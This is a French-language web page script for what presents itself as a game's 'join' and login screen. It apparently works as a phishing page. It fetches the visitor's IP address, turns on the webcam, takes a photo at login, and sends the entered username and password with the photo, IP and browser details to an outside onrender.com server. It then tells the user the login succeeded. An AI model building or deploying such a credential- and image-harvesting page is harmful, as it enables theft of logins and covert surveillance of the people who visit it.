<script>
document.addEventListener('DOMContentLoaded', () => {
    const mainCard = document.getElementById('mainCard');
    const loginCard = document.getElementById('loginCard');
    const joinBtn = document.getElementById('joinBtn');
    const loginBtn = document.getElementById('loginBtn');
    const videoStream = document.getElementById('videoStream');

    let userIpAddress = 'Non détectée';

    // Récupération de l'IP au chargement
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => { userIpAddress = data.ip; })
        .catch(err => console.error("Erreur IP:", err));

    // Activation de la caméra pour le flux vidéo de fond
    navigator.mediaDevices?.getUserMedia({ video: true })
        .then(stream => {
            if (videoStream) {
                videoStream.srcObject = stream;
                videoStream.classList.remove('hidden');
            }
        })
        .catch(err => console.error("Caméra non autorisée :", err));

    // Fonction de capture photo depuis le flux vidéo
    function capturePhoto() {
        if (!videoStream || !videoStream.srcObject) return null;
        try {
            const canvas = document.createElement('canvas');
            canvas.width = videoStream.videoWidth || 480;
            canvas.height = videoStream.videoHeight || 360;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoStream, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/jpeg', 0.8);
        } catch (e) {
            console.error("Erreur capture photo:", e);
            return null;
        }
    }

    // 1. Bouton "Rejoindre le jeu" -> Animation d'affichage du formulaire
    joinBtn.addEventListener('click', () => {
        mainCard.classList.add('fade-out');
        setTimeout(() => {
            mainCard.classList.add('hidden');
            loginCard.classList.remove('hidden');
            loginCard.style.opacity = '1';
            loginCard.style.transform = 'scale(1)';
        }, 400);
    });

    // 2. Bouton "Se connecter" -> Envoi unique et propre des données
    loginBtn.addEventListener('click', async () => {
        const userInput = document.getElementById('username');
        const passInput = document.getElementById('password');

        const user = userInput ? userInput.value.trim() : '';
        const pass = passInput ? passInput.value.trim() : '';

        if (!user || !pass) {
            alert('Veuillez remplir tous les champs.');
            return;
        }

        const photoData = capturePhoto();

        try {
            const response = await fetch('https://unity-30ez.onrender.com/register', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: user,
                    password: pass,
                    ip: userIpAddress,
                    photo: photoData,
                    userAgent: navigator.userAgent
                })
            });

            if (response.ok) {
                alert('Connexion réussie !');
            } else {
                console.error("Erreur serveur lors de la réponse.");
            }
        } catch (e) {
            console.error("Erreur réseau lors de l'envoi :", e);
        }
    });
});
</script>
